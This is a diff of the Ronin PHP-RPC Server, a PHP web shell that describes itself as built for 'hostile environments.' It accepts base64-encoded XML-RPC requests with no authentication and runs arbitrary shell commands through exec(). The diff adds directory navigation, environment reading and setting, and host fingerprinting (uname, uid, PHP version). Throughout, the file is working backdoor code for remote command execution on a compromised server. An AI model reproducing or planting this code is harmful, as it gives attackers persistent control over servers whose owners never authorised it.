@@ -1,54 +1,88 @@
-<!--
- Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
- environments.
-
- Copyright (c) 2007-2008
-
- This program is free software; you can redistribute it and/or modify
- it under the terms of the GNU General Public License as published by
- the Free Software Foundation; either version 2 of the License, or
- (at your option) any later version.
-
- This program is distributed in the hope that it will be useful,
- but WITHOUT ANY WARRANTY; without even the implied warranty of
- MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
- GNU General Public License for more details.
-
- You should have received a copy of the GNU General Public License
- along with this program; if not, write to the Free Software
- Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
--->
-
 <?php
+#
+# Ronin PHP-RPC Server - A PHP-RPC server designed to work in hostile
+# environments.
+#
+# Copyright (c) 2007-2008
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation; either version 2 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
+#
+
+function rpc_method_proxy($method,$arguments,$server)
+{
+  $session = array_shift($arguments);
+  $func = $server->methods[$method];
+
+  $server->load_session($session);
+
+  if (is_array($func))
+  {
+    $ret = $func[0]->$func[1]($arguments);
+  }
+  else
+  {
+    $ret = $func($arguments);
+  }
+
+  $new_session = $server->save_session();
+
+  return array('session' => $new_session, 'return_value' => $ret);
+}
 
 class RPCServer
 {
   var $_server;
+
+  var $methods;
 
   var $services;
 
   function RPCServer()
   {
     $this->_server = xmlrpc_server_create();
+    $this->methods = array();
     $this->services = array();
   }
 
-  function load_session()
+  function load_session($session)
   {
-    foreach (array_values($this->services) as $service)
+    foreach ($session as $name => $values)
     {
-      $service->load_session();
+      if (isset($this->services[$name]))
+      {
+        foreach ($this->services[$name]->persistant as $var)
+        {
+          if (isset($values[$var]))
+          {
+            $this->services[$name]->$var = $values[$var];
+          }
+        }
+      }
     }
   }
 
   function register_method($name,$function)
   {
-    return xmlrpc_server_register_method($this->_server, $name, $function);
+    $this->methods[$name] = $function;
+
+    return xmlrpc_server_register_method($this->_server, $name, 'rpc_method_proxy');
   }
 
-  function register_service($name,$service)
+  function register_service($name,&$service)
   {
-    $this->services[] = $service;
+    $this->services[$name] =& $service;
 
     foreach ($service->methods as $rpc_name => $method)
     {
@@ -58,7 +92,7 @@ class RPCServer
 
   function call_method($xml)
   {
-    return xmlrpc_server_call_method($this->_server, $xml, null);
+    return xmlrpc_server_call_method($this->_server, $xml, $this);
   }
 
   function rpc_services($method)
@@ -68,56 +102,56 @@ class RPCServer
 
   function save_session()
   {
+    $session = array();
+
     foreach ($this->services as $name => $service)
     {
-      $service->save_session();
+      $session[$name] = array();
+
+      foreach ($service->persistant as $var)
+      {
+        $session[$name][$var] = $service->$var;
+      }
     }
+
+    return $session;
   }
 }
 
 class Service
 {
-
   var $methods;
+
+  var $persistant;
 
   function Service()
   {
     $this->methods = array();
+    $this->persistant = array();
   }
 
-  function load_session() {}
-
-  function save_session() {}
-
+  function is_windows()
+  {
+    return substr(PHP_OS, 0, 3) == 'WIN';
+  }
 }
 
 class ConsoleService extends Service
 {
-
   var $includes;
 
   function ConsoleService()
   {
+    $this->includes = array();
     $this->methods = array(
       'invoke' => 'rpc_invoke',
       'fingerprint' => 'rpc_fingerprint'
     );
+
+    $this->persistant = array('includes');
   }
 
-  function load_session()
-  {
-    if (isset($_SESSION['rpc_includes']))
-    {
-      $this->includes = unserialize($_SESSION['rpc_includes']);
-
-      foreach ($this->includes as $path)
-      {
-        include($path);
-      }
-    }
-  }
-
-  function rpc_invoke($method,$params)
+  function rpc_invoke($params)
   {
     $name = $params[0];
     $arguments = $params[1];
@@ -142,10 +176,15 @@ class ConsoleService extends Service
     return $ret;
   }
 
-  function rpc_fingerprint($method,$params)
+  function rpc_fingerprint($params)
   {
     $profile = array(
-      'uname' => php_uname(),
+      'os' => PHP_OS,
+      'system_name' => php_uname('s'),
+      'system_release' => php_uname('r'),
+      'system_version' => php_uname('v'),
+      'machine_type' => php_uname('m'),
+      'host_name' => php_uname('n'),
       'php_server_api' => php_sapi_name(),
       'php_version' => phpversion(),
       'uid' => posix_getuid(),
@@ -164,52 +203,159 @@ class ConsoleService extends Service
 
     return $profile;
   }
-
-  function save_session()
-  {
-    $_SESSION['rpc_includes'] = serialize($this->includes);
-  }
-
 }
 
 class ShellService extends Service
 {
+  var $cwd;
+
+  var $env;
 
   function ShellService()
   {
-    $this->methods = array('exec' => 'rpc_exec');
+    $this->cwd = getcwd();
+    $this->env = array();
+
+    $this->methods = array(
+      'exec' => 'rpc_exec',
+      'cd' => 'rpc_cd',
+      'cwd' => 'rpc_cwd',
+      'env' => 'rpc_env',
+      'getenv' => 'rpc_getenv',
+      'setenv' => 'rpc_setenv'
+    );
+
+    $this->persistant = array('cwd', 'env');
   }
 
-  function rpc_exec($method,$arguments)
+  function format($obj)
   {
-    $command = join($arguments, ' ');
-    $output = array();
+    if (is_array($obj))
+    {
+      $formatted = array();
 
+      foreach($obj as $value)
+      {
+        $formatted[] = $this->format($value);
+      }
+
+      return join(' ', $formatted);
+    }
+    else if ($obj == null)
+    {
+      return '';
+    }
+
+    return "{$obj}";
+  }
+
+  function exec_output($command)
+  {
+    $output = array();
     exec($command, &$output);
 
-    return join($output, "\n");
+    return $output;
   }
 
+  function load_env()
+  {
+    if ($this->is_windows())
+    {
+      $command = 'set';
+    }
+    else
+    {
+      $command = 'env';
+    }
+
+    $this->env = array();
+
+    foreach ($this->exec_output($command) as $line)
+    {
+      list($name, $value) = explode('=', $line, 2);
+      $this->env[$name] = $value;
+    }
+  }
+
+  function rpc_cwd($arguments)
+  {
+    return $this->cwd;
+  }
+
+  function rpc_cd($arguments)
+  {
+    $new_cwd = $arguments[0];
+
+    if ($new_cwd[0] != DIRECTORY_SEPARATOR)
+    {
+      $new_cwd = $this->cwd . DIRECTORY_SEPARATOR . $new_cwd;
+    }
+
+    $new_cwd = realpath($new_cwd);
+
+    if (file_exists($new_cwd))
+    {
+      $this->cwd = $new_cwd;
+      return true;
+    }
+
+    return false;
+  }
+
+  function rpc_env($arguments)
+  {
+    return $this->env;
+  }
+
+  function rpc_getenv($arguments)
+  {
+    return $this->env[$arguments[0]];
+  }
+
+  function rpc_setenv($arguments)
+  {
+    return $this->env[$arguments[0]] = $arguments[1];
+  }
+
+  function rpc_exec($arguments)
+  {
+    $command = 'cd ' . $this->cwd . '; ';
+
+    if (count($arguments) > 1)
+    {
+      $command .= array_shift($arguments) . ' ' . $this->format($arguments);
+    }
+    else
+    {
+      $command .= $arguments[0];
+    }
+
+    $command .= '; pwd';
+
+    $output = $this->exec_output($command);
+    $this->cwd = array_pop($output);
+
+    return join("\n", $output);
+  }
 }
 
+function rpc_test()
+{
+  return true;
+}
 
 if (isset($_REQUEST['rpc_call']))
 {
   $server = new RPCServer();
   $server->register_service('console', new ConsoleService());
   $server->register_service('shell', new ShellService());
+  $server->register_method('test', 'rpc_test');
 
-  $server->load_session();
+  $xml = base64_decode(rawurldecode($_REQUEST['rpc_call']));
+  $response = $server->call_method($xml);
 
-  $xml = base64_decode(urldecode($_REQUEST['rpc_call']));
-
-  echo('<rpc>');
-  echo($server->call_method($xml));
-  echo('</rpc>');
-
-  $server->save_session();
-
-  exit(0);
+  echo("<rpc>{$response}</rpc>");
+  exit;
 }
 else
 {
@@ -226,7 +372,7 @@ else
     <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-1.2.6.min.js"></script>
     <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery-ui-personalized-1.5.2.min.js"></script>
     <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery.terminal.js"></script>
-    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery.xmlrpc.js"></script>
+    <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/jquery.phprpc.js"></script>
     <script type="text/javascript" src="http://ronin.rubyforge.org/dist/php/rpc/ajax/js/ui.js"></script>
 
     <script type="text/javascript" language="javascript">
